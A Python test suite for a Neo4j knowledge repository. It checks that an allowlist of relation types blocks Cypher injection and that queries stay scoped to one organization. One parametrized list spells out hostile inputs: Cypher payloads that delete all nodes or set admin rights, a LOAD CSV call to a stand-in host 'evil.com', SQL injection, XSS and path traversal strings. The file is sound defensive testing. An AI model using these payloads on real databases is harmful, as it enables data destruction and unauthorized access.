"""
Security tests for Neo4j repository - Cypher injection prevention.

Tests the allowlist-based protection against Cypher injection attacks
through LLM-generated relation types.

**Security:** CRITICAL - Prevents CVSS 8.1 vulnerability
"""
import pytest
from unittest.mock import MagicMock

from app.repositories.neo4j_knowledge_repository import (
    Neo4jKnowledgeRepository,
    ALLOWED_RELATION_TYPES
)


def _repo_with_mock_session(result_records=None):
    repo = Neo4jKnowledgeRepository()
    repo._available = True
    repo._driver = MagicMock()

    session = MagicMock()
    result = MagicMock()
    result.single.return_value = (
        result_records[0] if result_records else {"id": "entity-1"}
    )
    result.__iter__ = lambda self: iter(result_records or [])
    session.run.return_value = result
    session.__enter__ = lambda s: session
    session.__exit__ = MagicMock(return_value=False)
    repo._driver.session.return_value = session
    return repo, session


class TestCypherInjectionPrevention:
    """Test suite for Cypher injection prevention."""

    def test_allowed_relation_types_defined(self):
        """Verify allowlist is properly defined as frozenset."""
        assert isinstance(ALLOWED_RELATION_TYPES, frozenset), \
            "ALLOWED_RELATION_TYPES must be a frozenset for immutability"
        assert len(ALLOWED_RELATION_TYPES) >= 10, \
            "Allowlist should have at least 10 relation types"

        # Verify core relation types are present
        required_types = {"REFERENCES", "PART_OF", "DEFINES", "REQUIRES", "APPLIES_TO"}
        assert required_types.issubset(ALLOWED_RELATION_TYPES), \
            f"Missing required relation types: {required_types - ALLOWED_RELATION_TYPES}"

    def test_allowlist_is_immutable(self):
        """Verify allowlist cannot be modified at runtime."""
        with pytest.raises(AttributeError):
            ALLOWED_RELATION_TYPES.add("MALICIOUS_TYPE")

    @pytest.mark.parametrize("malicious_type", [
        # Classic Cypher injection payloads
        "EVIL}]->(x) DETACH DELETE x MERGE (s)-[r:PWNED",
        "TEST}] SET s.admin=true MERGE (a)-[r:HACKED",
        "FOO}]->(b) MATCH (n) DETACH DELETE n //",
        "BAR\"}]->(c) RETURN 'injected' //",

        # SQL-style injections (won't work but should still be blocked)
        "'; DROP DATABASE neo4j; //",
        "\" OR 1=1 --",

        # Command injection attempts
        "REFERENCES}]->(x) CALL db.labels() //",
        "A}]->(b) LOAD CSV FROM 'http://evil.com/data' AS row //",
        "B}]->(c) CALL apoc.cypher.run('MATCH (n) DETACH DELETE n', {}) //",

        # Edge cases
        "",  # Empty string
        " ",  # Whitespace only
        "\n",  # Newline
        "\t",  # Tab
        "REF ERENCES",  # Space in middle
        "references",  # Lowercase (should be uppercase)
        "REFERENCES\n",  # With trailing newline
        " REFERENCES",  # Leading whitespace
        "REFERENCES ",  # Trailing whitespace

        # Unicode attacks
        "REFERENCES\u0000",  # Null byte
        "REFER\u200bENCES",  # Zero-width space

        # Path traversal attempts
        "../REFERENCES",
        "../../etc/passwd",

        # Script injection
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",

        # Format string attacks
        "%s%s%s%s",
        "{relation_type}",

        # Newline injection
        "REFERENCES\nMATCH (n) DETACH DELETE n",

        # Multiple statements
        "REFERENCES; MATCH (n) DETACH DELETE n;",
    ])
    @pytest.mark.asyncio
    async def test_rejects_malicious_relation_types(self, malicious_type):
        """Verify malicious relation types are rejected."""
        repo = Neo4jKnowledgeRepository()

        with pytest.raises(ValueError) as exc_info:
            await repo.create_entity_relation(
                source_id="test_source",
                target_id="test_target",
                relation_type=malicious_type,
                description="Test injection attempt"
            )

        # Verify error message is helpful
        error_message = str(exc_info.value)
        assert "Invalid relation type" in error_message, \
            "Error message should indicate invalid relation type"
        assert malicious_type in error_message or "Must be one of" in error_message, \
            "Error message should include the rejected type or allowed types"

    @pytest.mark.parametrize("valid_type", [
        "REFERENCES",
        "PART_OF",
        "MENTIONS",
        "DEFINES",
        "CONTAINS",
        "APPLIES_TO",
        "REQUIRES",
        "EXAMPLE_OF",
        "CONTRADICTS",
        "SUPPORTS",
        "PREREQUISITE",
        "FOLLOWS",
        "RELATED_TO",
    ])
    @pytest.mark.asyncio
    async def test_accepts_valid_relation_types(self, valid_type):
        """Verify all valid relation types are accepted by validation."""
        repo = Neo4jKnowledgeRepository()

        # Should not raise ValueError
        # Note: May still fail due to Neo4j not being available, but that's different
        try:
            await repo.create_entity_relation(
                source_id="test_source",
                target_id="test_target",
                relation_type=valid_type,
                description="Test valid type"
            )
        except ValueError as e:
            # If ValueError is raised, it should NOT be about invalid relation type
            assert "Invalid relation type" not in str(e), \
                f"Valid relation type '{valid_type}' was rejected: {e}"
        except Exception:
            # Other exceptions (Neo4j not available, etc.) are acceptable for this test
            pass

    @pytest.mark.asyncio
    async def test_validation_is_case_sensitive(self):
        """Verify validation is case-sensitive (security best practice)."""
        repo = Neo4jKnowledgeRepository()

        # Lowercase should fail
        with pytest.raises(ValueError, match="Invalid relation type"):
            await repo.create_entity_relation(
                source_id="test",
                target_id="test",
                relation_type="references",  # lowercase
                description="test"
            )

    @pytest.mark.asyncio
    async def test_no_partial_matches(self):
        """Verify partial string matches are rejected."""
        repo = Neo4jKnowledgeRepository()

        partial_matches = [
            "REF",  # Prefix of REFERENCES
            "ENCES",  # Suffix of REFERENCES
            "REFEREN",  # Partial
            "REFERENCES_EXTRA",  # With suffix
            "PREFIX_REFERENCES",  # With prefix
        ]

        for partial in partial_matches:
            with pytest.raises(ValueError, match="Invalid relation type"):
                await repo.create_entity_relation(
                    source_id="test",
                    target_id="test",
                    relation_type=partial,
                    description="test"
                )

    @pytest.mark.asyncio
    async def test_validation_happens_before_neo4j_query(self):
        """Verify validation happens before any Neo4j interaction."""
        repo = Neo4jKnowledgeRepository()

        # Even if Neo4j is not available, validation should still raise ValueError
        malicious_type = "EVIL}]->(x) DETACH DELETE x"

        with pytest.raises(ValueError, match="Invalid relation type"):
            await repo.create_entity_relation(
                source_id="test",
                target_id="test",
                relation_type=malicious_type,
                description="Should fail before Neo4j call"
            )

    def test_allowlist_types_are_valid_cypher_identifiers(self):
        """Verify all allowlist types are valid Cypher relationship type identifiers."""
        import re

        # Cypher relationship types must match: [A-Z_][A-Z0-9_]*
        cypher_identifier_pattern = re.compile(r'^[A-Z_][A-Z0-9_]*$')

        for rel_type in ALLOWED_RELATION_TYPES:
            assert cypher_identifier_pattern.match(rel_type), \
                f"Relation type '{rel_type}' is not a valid Cypher identifier"

    def test_allowlist_has_no_duplicates(self):
        """Verify allowlist has no duplicate entries."""
        # frozenset automatically deduplicates, but verify explicit list has no dupes
        types_list = list(ALLOWED_RELATION_TYPES)
        assert len(types_list) == len(set(types_list)), \
            "Allowlist should not have duplicate entries"

    def test_allowlist_has_documentation(self):
        """Verify ALLOWED_RELATION_TYPES is well-documented in code."""
        import inspect
        import app.repositories.neo4j_knowledge_repository as repo_module

        source = inspect.getsource(repo_module)

        # Check for security comment
        assert "SECURITY" in source or "security" in source, \
            "Security documentation should be present"
        assert "injection" in source.lower(), \
            "Should mention injection prevention"
        assert "ALLOWED_RELATION_TYPES" in source, \
            "Constant should be defined in module"


class TestSecurityLogging:
    """Test that security events are properly logged."""

    @pytest.mark.asyncio
    async def test_rejected_types_are_logged(self, caplog):
        """Verify rejected relation types are logged for security monitoring."""
        import logging
        caplog.set_level(logging.WARNING)

        repo = Neo4jKnowledgeRepository()
        malicious_type = "EVIL}]->(x) DETACH DELETE x"

        with pytest.raises(ValueError):
            await repo.create_entity_relation(
                source_id="test_source",
                target_id="test_target",
                relation_type=malicious_type,
                description="test"
            )

        # Check that security warning was logged
        assert any(
            "SECURITY" in record.message and malicious_type in record.message
            for record in caplog.records
        ), "Rejected relation types should be logged with [SECURITY] tag"


class TestNeo4jKnowledgeOrgScope:
    """Test organization-scoped Neo4j entity graph access."""

    @pytest.mark.asyncio
    async def test_create_entity_uses_current_org_context(self, monkeypatch):
        from app.core.config import settings
        from app.core.org_context import current_org_id

        monkeypatch.setattr(settings, "enable_multi_tenant", True)
        monkeypatch.setattr(settings, "environment", "production")
        monkeypatch.setattr(settings, "default_organization_id", "default")

        token = current_org_id.set("org-A")
        try:
            repo, session = _repo_with_mock_session()
            assert await repo.create_entity(
                entity_id="entity-1",
                entity_type="ARTICLE",
                name="Rule 15",
                document_id="doc-1",
            ) is True
        finally:
            current_org_id.reset(token)

        query = session.run.call_args.args[0]
        params = session.run.call_args.kwargs
        assert "MERGE (e:Entity {id: $entity_id, organization_id: $organization_id})" in query
        assert params["organization_id"] == "org-A"

    @pytest.mark.asyncio
    async def test_create_entity_relation_scopes_source_and_target(self, monkeypatch):
        from app.core.config import settings
        from app.core.org_context import current_org_id

        monkeypatch.setattr(settings, "enable_multi_tenant", True)
        monkeypatch.setattr(settings, "environment", "production")
        monkeypatch.setattr(settings, "default_organization_id", "default")

        token = current_org_id.set("org-B")
        try:
            repo, session = _repo_with_mock_session([{"rel_type": "REFERENCES"}])
            assert await repo.create_entity_relation(
                source_id="entity-source",
                target_id="entity-target",
                relation_type="REFERENCES",
            ) is True
        finally:
            current_org_id.reset(token)

        query = session.run.call_args.args[0]
        params = session.run.call_args.kwargs
        assert "Entity {id: $source_id, organization_id: $organization_id}" in query
        assert "Entity {id: $target_id, organization_id: $organization_id}" in query
        assert params["organization_id"] == "org-B"

    @pytest.mark.asyncio
    async def test_get_document_entities_blocks_missing_org_before_session(self, monkeypatch):
        from app.core.config import settings
        from app.core.org_context import current_org_id

        monkeypatch.setattr(settings, "enable_multi_tenant", True)
        monkeypatch.setattr(settings, "environment", "production")
        monkeypatch.setattr(settings, "default_organization_id", "default")

        token = current_org_id.set(None)
        try:
            repo, _session = _repo_with_mock_session([])
            assert await repo.get_document_entities("private-doc") == []
        finally:
            current_org_id.reset(token)

        repo._driver.session.assert_not_called()

    @pytest.mark.asyncio
    async def test_get_entity_relations_blocks_missing_org_before_session(self, monkeypatch):
        from app.core.config import settings
        from app.core.org_context import current_org_id

        monkeypatch.setattr(settings, "enable_multi_tenant", True)
        monkeypatch.setattr(settings, "environment", "production")
        monkeypatch.setattr(settings, "default_organization_id", "default")

        token = current_org_id.set(None)
        try:
            repo, _session = _repo_with_mock_session([])
            assert await repo.get_entity_relations("private-entity") == []
        finally:
            current_org_id.reset(token)

        repo._driver.session.assert_not_called()


class TestBackwardCompatibility:
    """Test that security fix doesn't break existing functionality."""

    @pytest.mark.asyncio
    async def test_existing_valid_calls_still_work(self):
        """Verify that legitimate use cases are not affected."""
        repo = Neo4jKnowledgeRepository()

        # Common use cases from kg_builder_agent.py
        valid_calls = [
            ("article_15", "vessel_crossing", "APPLIES_TO"),
            ("rule_7", "safe_speed", "DEFINES"),
            ("colregs", "article_15", "PART_OF"),
            ("radar", "collision_avoidance", "REQUIRES"),
            ("vessel_a", "vessel_b", "REFERENCES"),
        ]

        for source, target, rel_type in valid_calls:
            try:
                await repo.create_entity_relation(
                    source_id=source,
                    target_id=target,
                    relation_type=rel_type,
                    description="Test backward compatibility"
                )
            except ValueError as e:
                if "Invalid relation type" in str(e):
                    pytest.fail(
                        f"Valid relation type '{rel_type}' should not be rejected: {e}"
                    )
            except Exception:
                # Other exceptions (Neo4j unavailable) are OK for this test
                pass
